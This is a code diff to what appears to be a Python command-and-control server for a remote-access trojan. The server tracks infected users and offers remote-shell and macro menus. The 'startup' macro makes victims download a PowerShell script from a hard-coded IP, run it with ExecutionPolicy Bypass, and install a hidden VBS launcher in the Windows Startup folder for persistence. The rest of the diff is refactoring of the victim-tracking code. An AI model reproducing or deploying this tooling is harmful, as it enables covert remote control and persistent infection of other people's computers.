@@ -25,10 +25,13 @@ onlines = {}
 
 macros = {
     "startup": {"args": [], "steps": [
-            "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; } Invoke-WebRequest -Uri 'http://194.195.244.202:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
+            "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; }",
+            "Invoke-WebRequest -Uri 'http://194.195.244.202:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
+            "Write-Output 'powershell.exe -ExecutionPolicy Bypass C:\IFound/mogus.ps1' | Out-File ifound.bat -encoding ASCII",
             "cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'",
-            "Write-Output 'cmd /c start /min \"\"  Powershell.exe -ExecutionPolicy ByPass -windowstyle hidden -File \"C:/IFound/mogus.ps1\"' | Out-File ifound.cmd -encoding ASCII",
+            "Write-Output 'Set WinScriptHost = CreateObject(\"WScript.Shell\")\nWinScriptHost.Run Chr(34) & \"C:\Users\Mikkel\Documents\scriptName.bat\" & Chr(34), 0\nSet WinScriptHost = Nothing' | Out-File ifound.vbs -encoding ASCII",
             "cd ~"
+           
         ]},
     "discord-message": {"args": ["to", "message"], "steps": [
         ""
@@ -55,9 +58,8 @@ def client_handler(connection):
     # Check if data.decode("utf-8")+" "+connection.getpeername()[0] in database if not add it
     cur.execute("SELECT info FROM users;")
     values = cur.fetchall()
-    user = whoami+" "+connection.getpeername()[0]
-    already_exists = not all(
-        [x[0] != user for x in values])
+    user = f"{whoami} {connection.getpeername()[0]}"
+    already_exists = any(x[0] == user for x in values)
     if not already_exists:
         con.execute("INSERT INTO users VALUES (?);",
                     (user, ))
@@ -87,7 +89,7 @@ def start_server(host, port):
         ServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         ServerSocket.bind((host, port))
     except socket.error as e:
-        print(str(e))
+        print(e)
 
     ServerSocket.listen()
 
@@ -97,11 +99,8 @@ def start_server(host, port):
 
 def macro():
     cur.execute("SELECT info FROM users;")
-    avalible = []
-    for row in cur.fetchall():
-        if row[0] in onlines.keys():
-            avalible.append(row[0])
-    if len(avalible) == 0:
+    avalible = [row[0] for row in cur.fetchall() if row[0] in onlines.keys()]
+    if not avalible:
         print("No users avalible ;(")
         return
     print("_"*max(map(len, avalible))+"__")
@@ -143,11 +142,8 @@ def macro():
 
 def shell():
     cur.execute("SELECT info FROM users;")
-    avalible = []
-    for row in cur.fetchall():
-        if row[0] in onlines.keys():
-            avalible.append(row[0])
-    if len(avalible) == 0:
+    avalible = [row[0] for row in cur.fetchall() if row[0] in onlines.keys()]
+    if not avalible:
         print("No users avalible ;(")
         return
     print("_"*max(map(len, avalible))+"__")
